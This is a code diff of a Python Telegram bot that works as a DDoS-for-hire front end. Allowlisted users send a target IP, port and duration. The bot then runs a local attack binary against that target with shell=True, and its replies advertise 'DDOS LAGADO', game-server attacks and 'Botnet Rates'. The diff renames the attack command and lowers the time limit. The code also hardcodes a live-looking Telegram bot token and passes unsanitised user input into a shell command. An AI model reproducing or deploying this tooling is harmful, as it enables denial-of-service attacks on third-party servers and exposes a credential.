@@ -1,4 +1,4 @@
-#aaruddoserpython
+#aadiddoserpython
 
 import telebot
 import subprocess
@@ -11,10 +11,8 @@ bot = telebot.TeleBot('7799225662:AAFYX1oLc7AEYq1tzHDdmUb4omfgYoNnxqM')
 # Admin user IDs
 admin_id = {"1302320722", "", ""}
 
-# File to store allowed user IDs
-USER_FILE = "users.txt"
 
-# File to store command logs
+USER_FILE = "users.txt"
 LOG_FILE = "log.txt"
 
 def read_users():
@@ -197,50 +195,50 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-# Function to handle the reply when free users run the /aaru command
+# Function to handle the reply when free users run the /aadi command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: aaru\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
+    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VVIP\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /aaru command
-aaru_cooldown = {}
+# Dictionary to store the last time each user ran the /aadi command
+aadi1_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /aaru command
-@bot.message_handler(commands=['aaru'])
-def handle_aaru(message):
+# Handler for /aadi command
+@bot.message_handler(commands=['aadi1'])
+def handle_aadi1(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in aaru_cooldown and (datetime.datetime.now() - aaru_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait sometime Before Running The /aaruCommand Again."
+            if user_id in aadi1_cooldown and (datetime.datetime.now() - aadi1_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 3sec Before Running The /aadi1 Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            aaru_cooldown[user_id] = datetime.datetime.now()
+            aadi1_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 301:
-                response = "Error: Time interval must be less than 300."
+            if time > 121:
+                response = "Error: Time interval must be less than 120."
             else:
-                record_command_logs(user_id, '/aaru', target, port, time)
+                record_command_logs(user_id, '/aadi1', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./aaru{target} {port} {time} 1800"
+                full_command = f"./aadi1 {target} {port} {time} 1800"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /aaru<target> <port> <time>"  # Updated command syntax
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /aadi1 <target> <port> <time>"  # Updated command syntax
     else:
         response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @user_x_dead ."
 
@@ -248,7 +246,7 @@ def handle_aaru(message):
 
 
 
-# Add /mylogs command to display logs recorded for aaru and website commands
+# Add /mylogs command to display logs recorded for aadi1 and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -272,7 +270,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /aaru: Method For aaru Servers. 
+💥 /aadi1 : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
